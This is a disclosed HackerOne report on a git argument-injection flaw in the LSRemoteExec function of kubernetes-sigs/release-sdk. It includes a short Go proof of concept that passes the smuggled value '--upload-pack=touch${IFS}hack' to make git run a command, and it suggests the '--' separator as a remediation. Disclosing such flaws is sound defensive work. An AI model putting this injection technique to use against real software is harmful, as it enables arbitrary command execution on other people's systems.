# Git Arg Injection in  kubernetes-sigs/release-sdk 

## Report Details
- **Report ID**: 1763704
- **URL**: https://hackerone.com/reports/1763704
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-11-06T17:50:42.872Z
- **Disclosed**: 2023-05-25T12:48:18.341Z

## Reporter
- **Username**: snoopysecurity
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
Technical Details: It's possible to get a command injection via argument injection.

The LSRemoteExec function (https://github.com/kubernetes-sigs/release-sdk/blob/main/git/git.go#L336) is concentating user input with a git command that can be leveraged for arbritary command injection. More details of this issue can be found here: https://snyk.io/blog/argument-injection-when-using-git-and-mercurial/

The below PoC uses the git package from kubernetes-sigs, and the following payload `--upload-pack=touch${IFS}hack` is provided to it which creates a file called hack in the local system.

```
package main

import (
	"fmt"
	"github.com/kubernetes-sigs/release-sdk/git"
)

func main() {
	fmt.Println("hello world")

	var result,err = git.LSRemoteExec("--upload-pack=touch${IFS}hack","master")
	if err != nil {
		fmt.Println(err)
	}

fmt.Println(result)

}

```
I see this package being used here: https://github.com/kubernetes/release/blob/master/pkg/release/branch_checker.go#L44 but i wasn't fully able to understand how branch checker was being used within the kubernetes release package.


A possible remediation to fix this issue (it's just a suggestion - it has to be tested) could be to add `--` before user provided values.

Below similars issues with some references and suggestions on how to fix this:

      * fix commit: https://github.com/composer/composer/commit/332c46af8bebdead80a2601350dff7af0ac1f490
    * "dispatch: stop parsing of early boolean option at "--"": https://www.mercurial-scm.org/repo/hg/rev/e16f68c4abe3
    * "dispatch: add HGPLAIN=+strictflags to restrict early parsing of global options": https://www.mercurial-scm.org/repo/hg/rev/c9740b69b9b7 (https://www.mercurial-scm.org/repo/hg/help/environment)

## Impact

If user input flows into the `LSRemoteExec`, it could allow execution of arbritary commands.

## Attachments
No attachments
